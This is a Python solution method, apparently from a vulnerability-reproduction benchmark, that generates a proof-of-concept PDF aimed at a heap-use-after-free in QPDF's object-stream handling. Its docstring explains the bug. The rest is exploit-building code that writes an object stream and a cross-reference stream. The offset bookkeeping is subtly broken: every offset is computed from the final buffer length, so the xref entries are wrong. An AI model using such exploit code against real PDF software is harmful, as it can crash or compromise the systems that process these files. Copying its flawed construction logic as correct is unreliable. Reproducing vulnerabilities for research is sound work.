import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC PDF that triggers a heap-use-after-free in QPDF.

        The vulnerability is in QPDF::getCompressibleObjSet. When iterating
        over the object cache, calling getObject() for an object within an
        object stream causes the entire stream to be unpacked. During this
        process, other placeholder objects from the same stream are removed
        from the cache. This can invalidate the iterator used in the loop,
        leading to a use-after-free when the loop continues.

        This PoC constructs a PDF with an object stream containing two objects
        (5 and 6). A page object references both, which populates the object
        cache with placeholders for them. When getCompressibleObjSet iterates
        over the cache (in sorted order of object ID), it processes object 5
        first. This triggers the unpacking of the object stream, which removes
        the placeholder for object 6. The loop's iterator then attempts to
        access the now-removed object 6, causing the crash.
        """

        # Define the content of objects to be placed in the object stream.
        # These are simple dictionaries, without 'obj'/'endobj' keywords.
        obj_5_inner = b'<</MyObj 5>>'
        obj_6_inner = b'<</MyObj 6>>'

        # The object stream's index lists object numbers and their offsets
        # relative to the start of the stream's data portion.
        # Format: (obj_num offset obj_num offset ...)
        header = b'5 0 6 %d' % len(obj_5_inner)
        
        # The full, uncompressed content of the object stream.
        obj_stream_plain_content = header + obj_5_inner + obj_6_inner
        obj_stream_compressed = zlib.compress(obj_stream_plain_content)

        # Build the PDF file as a list of byte strings.
        pdf_parts = []
        pdf_parts.append(b'%PDF-1.5\n')  # Object streams require PDF 1.5+
        pdf_parts.append(b'%\xDE\xAD\xBE\xEF\n') # Binary comment

        offsets = {}
        
        # Helper to add an object and update offsets
        def add_object(obj_content):
            pdf_parts.append(obj_content)

        # Object 1: Catalog
        offsets[1] = lambda: len(b"".join(pdf_parts))
        add_object(b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n')
        
        # Object 2: Pages tree root
        offsets[2] = lambda: len(b"".join(pdf_parts))
        add_object(b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n')
        
        # Object 3: Page object, referencing objects 5 and 6.
        offsets[3] = lambda: len(b"".join(pdf_parts))
        add_object(b'3 0 obj\n<</Type/Page/Parent 2 0 R/Resources<</XObject<</O5 5 0 R/O6 6 0 R>>>>>>\nendobj\n')
        
        # Object 4: The Object Stream containing objects 5 and 6.
        offsets[4] = lambda: len(b"".join(pdf_parts))
        obj4_dict = b'<</Type/ObjStm/N 2/First %d/Filter/FlateDecode/Length %d>>' % (len(header), len(obj_stream_compressed))
        add_object(b'4 0 obj\n' + obj4_dict + b'\nstream\n' + obj_stream_compressed + b'\nendstream\nendobj\n')

        # Finalize offsets now that all regular objects are placed.
        final_offsets = {k: v() for k, v in offsets.items()}

        # Object 7: The Cross-Reference Stream.
        xref_obj_num = 7
        xref_pos = len(b"".join(pdf_parts))
        final_offsets[xref_obj_num] = xref_pos

        # XRef stream entries. /W [1 4 2] -> type(1), field2(4), field3(2).
        # We describe objects 0-7 (Size 8).
        entry0 = b'\x00' + (0).to_bytes(4, 'big') + (65535).to_bytes(2, 'big')
        entry1 = b'\x01' + final_offsets[1].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        entry2 = b'\x01' + final_offsets[2].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        entry3 = b'\x01' + final_offsets[3].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        entry4 = b'\x01' + final_offsets[4].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        entry5 = b'\x02' + (4).to_bytes(4, 'big') + (0).to_bytes(2, 'big') # Obj 5 in ObjStm 4, index 0
        entry6 = b'\x02' + (4).to_bytes(4, 'big') + (1).to_bytes(2, 'big') # Obj 6 in ObjStm 4, index 1
        entry7 = b'\x01' + final_offsets[xref_obj_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        
        xref_stream_plain = entry0 + entry1 + entry2 + entry3 + entry4 + entry5 + entry6 + entry7
        xref_stream_compressed = zlib.compress(xref_stream_plain)
        
        xref_dict = b'<</Type/XRef/Size 8/W[1 4 2]/Root 1 0 R/Filter/FlateDecode/Length %d>>' % len(xref_stream_compressed)
        add_object(b'%d 0 obj\n' % xref_obj_num + xref_dict + b'\nstream\n' + xref_stream_compressed + b'\nendstream\nendobj\n')

        # Trailer pointing to the XRef stream.
        add_object(b'startxref\n' + str(xref_pos).encode('ascii') + b'\n%%EOF\n')

        return b"".join(pdf_parts)
